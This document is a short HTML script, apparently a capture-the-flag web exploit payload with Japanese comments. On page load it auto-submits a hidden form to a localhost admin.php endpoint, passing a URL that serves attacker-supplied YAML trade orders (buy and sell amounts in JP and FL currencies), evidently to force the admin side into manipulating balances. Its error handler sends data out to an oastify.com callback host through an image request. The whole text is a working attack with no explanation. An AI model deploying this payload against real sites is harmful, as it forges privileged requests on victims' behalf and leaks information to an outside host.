<script>
    (async () => {
    try {
      // YAMLデータを作成
      const yaml = `- {amount: 1, currency: JP, op: BUY}
  - {amount: 1000000, currency: JP, op: SELL}
  - {amount: 1, currency: FL, op: BUY}`;

      // YAMLを返すエンドポイントURL
      const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);

      // POSTリクエストを送信するフォームを動的に作成
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:5000/admin.php';
      form.target = '_self';

      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'url';
      input.value = yamlUrl;

      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();

    } catch (e) {
      new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
    }
  })();
</script>
